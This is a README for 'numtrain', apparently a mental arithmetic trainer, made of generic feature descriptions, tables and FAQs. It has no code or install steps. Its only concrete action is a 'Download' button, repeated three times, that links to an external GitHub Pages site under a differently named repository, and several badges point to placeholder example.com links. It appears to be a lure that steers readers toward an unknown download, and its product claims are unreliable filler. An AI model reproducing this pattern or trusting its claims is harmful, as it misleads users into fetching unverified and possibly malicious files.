![preview](https://raw.githubusercontent.com/elproelpro267-ops/math-drill-arcade/main/hero_705a37b.svg)
[![Download](https://raw.githubusercontent.com/elproelpro267-ops/math-drill-arcade/main/get_58f8863.svg)](https://elproelpro267-ops.github.io/math-drill-arcade/)

# 🧮 numtrain

[![MIT License](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
[![Python](https://img.shields.io/badge/Python-3.11%2B-3776AB.svg)](https://www.python.org/)
[![Version](https://img.shields.io/badge/version-2.4.0-informational.svg)](https://example.com)
[![Status](https://img.shields.io/badge/status-actively--maintained-brightgreen.svg)](https://example.com)
[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey.svg)](https://example.com)

> A focused mental arithmetic companion that sharpens your number sense one drill at a time.

numtrain is a lightweight, terminal-first and browser-capable trainer built to make numbers feel like second nature. Whether you're a student preparing for timed exams, a developer keeping your mental math sharp between code reviews, or simply someone who wants to stop reaching for a calculator for basic sums, numtrain gives you a structured, adaptive path toward faster and more accurate arithmetic.

This project began as a small personal utility and evolved into a modular toolkit with adaptive difficulty, session analytics, multilingual prompts, and a responsive interface. The guiding philosophy is simple: mastery comes from repetition, but meaningful repetition comes from feedback. numtrain is the feedback loop.

[![Download](https://raw.githubusercontent.com/elproelpro267-ops/math-drill-arcade/main/get_58f8863.svg)](https://elproelpro267-ops.github.io/math-drill-arcade/)

---

## 📚 Table of Contents

- [Why numtrain Exists](#-why-numtrain-exists)
- [Core Features](#-core-features)
- [Adaptive Difficulty Engine](#-adaptive-difficulty-engine)
- [Multilingual Support](#-multilingual-support)
- [Responsive User Interface](#-responsive-user-interface)
- [Session Analytics and Progress Tracking](#-session-analytics-and-progress-tracking)
- [Exercise Categories](#-exercise-categories)
- [Configuration Options](#-configuration-options)
- [Keyboard Shortcuts](#-keyboard-shortcuts)
- [Extending numtrain](#-extending-numtrain)
- [Accessibility](#-accessibility)
- [Performance Notes](#-performance-notes)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Roadmap](#-roadmap)
- [Community and Contributions](#-community-and-contributions)
- [Support](#-support)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🧠 Why numtrain Exists

Most people learn arithmetic in school and then slowly let that skill erode as calculators, spreadsheets, and smartphones take over the heavy lifting. That trade-off is convenient, but it comes with a hidden cost: the loss of a cognitive muscle that once responded instantly to numbers.

numtrain is built on the premise that mental arithmetic is not a party trick — it is a foundational skill that improves estimation, financial intuition, and even debugging ability for programmers scanning logs full of values. The goal is not to turn anyone into a human calculator, but to make basic number operations feel effortless again.

Instead of overwhelming users with hundreds of settings, numtrain focuses on a small set of well-tuned drills that rotate intelligently based on your performance history.

---

## 🚀 Core Features

- **Adaptive question generation** that adjusts difficulty based on recent accuracy and response time.
- **Multiple operation types** including addition, subtraction, multiplication, division, and mixed-mode drills.
- **Timed and untimed sessions** so you can practice under pressure or at your own pace.
- **Instant feedback** with per-question evaluation and a short explanation of the correct path.
- **Session summaries** showing accuracy, average time per question, and streak length.
- **Persistent history** stored locally so progress carries across runs.
- **Multilingual interface** with translated prompts and locale-aware number formatting.
- **Responsive layout** that works equally well in a terminal, a narrow browser window, or a wide desktop screen.
- **Keyboard-first navigation** for users who prefer to keep both hands on the keys.
- **Customizable question pools** so you can drill only the ranges you care about.
- **Lightweight footprint** with no mandatory external service dependency.

---

## 🎯 Adaptive Difficulty Engine

At the heart of numtrain is a small scheduling algorithm that watches how you answer. Every correct answer nudges the difficulty upward; every incorrect answer or unusually slow response nudges it downward. The adjustment is deliberately gentle so that sessions do not feel erratic.

The engine tracks three dimensions:

1. **Magnitude** — how large the operands are.
2. **Operation** — which arithmetic family is being tested.
3. **Tempo** — how much time you are given per question.

Because these are tracked independently, a user who is fast at addition but slow at division will receive a different question mix than someone with the opposite profile.

---

## 🌍 Multilingual Support

numtrain ships with prompt templates for several languages and uses locale-aware formatting so that decimal separators and thousands groupings look natural to the reader. Translations are community-driven and stored as plain text resource files, which makes adding a new language a low-effort contribution.

Currently supported locales include English, Italian, Spanish, French, German, Portuguese, and Japanese. Additional locales can be dropped into the resources directory and will be picked up automatically at startup.

---

## 🖥️ Responsive User Interface

The interface adapts to the width of the terminal or browser pane it is rendered in. On narrow screens, questions and answer fields stack vertically. On wide screens, auxiliary information such as streak counters and session statistics move to a side panel so the main question stays visually centered.

The layout logic is intentionally simple, which keeps rendering fast and predictable across platforms.

---

## 📈 Session Analytics and Progress Tracking

After each session, numtrain produces a compact summary that includes:

- Total questions attempted
- Correct and incorrect counts
- Average response time
- Longest correct streak
- Weakest operation category

These summaries are appended to a local history file, which can be queried to render longer-term trends. A weekly and monthly rollup view is available through the built-in history command.

---

## 🧩 Exercise Categories

| Category | Description | Typical Use Case |
|----------|-------------|------------------|
| Addition | Sums of two or more operands | Warm-up drills |
| Subtraction | Differences with positive results | Mental borrowing practice |
| Multiplication | Products within configurable ranges | Times-table reinforcement |
| Division | Exact and remainder-inclusive division | Long-division intuition |
| Mixed | Random selection across operations | Realistic exam simulation |
| Percentage | Quick percentage and fraction conversions | Everyday estimation |

---

## ⚙️ Configuration Options

Configuration is stored in a human-readable file at the root of the user profile directory. Options include:

- default_session_length
- preferred_locale
- difficulty_floor and difficulty_ceiling
- enable_timer and timer_seconds
- question_pool_ranges
- color_theme

Each option has a sensible default, so the trainer is usable immediately without any edits.

---

## ⌨️ Keyboard Shortcuts

| Shortcut | Action |
|----------|--------|
| Enter | Submit answer |
| Tab | Skip current question |
| Ctrl+R | Restart session |
| Ctrl+H | Open history summary |
| Ctrl+L | Change locale |
| Esc | Exit trainer |

---

## 🧱 Extending numtrain

The codebase is organized into small, single-purpose modules: question generation, evaluation, scheduling, rendering, and storage. New question types can be registered by implementing a single interface and adding a descriptor to the registry.

Because the project avoids heavy dependencies, contributions are usually short and readable, which makes it a friendly target for first-time contributors.

---

## ♿ Accessibility

numtrain aims to be usable with screen readers and keyboard-only navigation. Prompts are announced clearly, colors are never the sole carrier of meaning, and the timer can be disabled for users who find time pressure counterproductive.

---

## ⚡ Performance Notes

Sessions start in well under a second on modern hardware. The rendering path avoids unnecessary redraws, and history operations are batched so that large histories do not slow down startup. Memory usage stays modest even after thousands of logged questions.

---

## ❓ Frequently Asked Questions

**Does numtrain require an internet connection?**
No. All drills run locally, and history is stored on your machine.

**Can I import or export my history?**
Yes. History is stored as plain structured text and can be moved between machines.

**Is there a mobile version?**
The responsive layout works in mobile browsers, and a terminal version is available through standard terminal emulators.

**How is difficulty decided?**
Through a small adaptive engine that weighs accuracy, magnitude, operation, and tempo.

---

## 🗺️ Roadmap

Planned improvements for 2026 include:

- Voice input for hands-free drills
- Additional locale packs contributed by the community
- Exportable PDF progress reports
- Optional cloud sync via user-provided storage

---

## 🤝 Community and Contributions

Contributions of all sizes are welcome, from typo fixes to new question generators. Please open an issue before starting large changes so the direction can be discussed. All participants are expected to follow respectful and constructive communication.

---

## 💬 Support

Support is available around the clock through issue discussions and community chat channels. Response times are typically short, and maintainers aim to acknowledge every report.

---

## ⚠️ Disclaimer

numtrain is provided as an educational tool for personal skill development. It is not a substitute for professional instruction in mathematics education, and results may vary between individuals. The maintainers are not responsible for any decisions made based on progress metrics produced by the tool. All trademarks mentioned belong to their respective owners.

---

## 📝 License

This project is released under the MIT License. See the full text at the link below.

https://opensource.org/licenses/MIT

Copyright (c) 2026 numtrain contributors.

[![Download](https://raw.githubusercontent.com/elproelpro267-ops/math-drill-arcade/main/get_58f8863.svg)](https://elproelpro267-ops.github.io/math-drill-arcade/)